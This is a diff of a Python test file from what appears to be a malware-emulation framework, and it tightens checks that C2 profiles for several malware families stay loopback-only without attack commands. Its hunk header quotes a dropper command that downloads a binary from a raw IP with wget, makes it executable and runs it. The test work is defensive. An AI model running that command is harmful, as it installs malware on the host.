@@ -168,8 +168,14 @@ cd /tmp; rm -rf JN2M; wget http://129.121.110.105/JN2M; chmod 777 JN2M; ./JN2M p
     assert result["download_endpoints"][0]["is_c2"] is False
 
 
-def test_batch3_profiles_use_loopback_only_noncompatible_emulator() -> None:
-    for family in ("eclipse_ddos_bot", "etherhiding_arweave_loader", "go_synthetic_workload"):
+def test_batch3_profiles_use_safe_loopback_emulators() -> None:
+    eclipse = json.loads(
+        (FRAMEWORK / "malware" / "eclipse_ddos_bot" / "c2_profile.json").read_text(encoding="utf-8")
+    )
+    assert eclipse["emulator"]["loopback_only"] is True
+    assert eclipse["emulator"]["malware_protocol_compatible"] is True
+    assert eclipse["emulator"]["attack_commands_implemented"] is False
+    for family in ("etherhiding_arweave_loader", "go_synthetic_workload"):
         profile = json.loads(
             (FRAMEWORK / "malware" / family / "c2_profile.json").read_text(encoding="utf-8")
         )
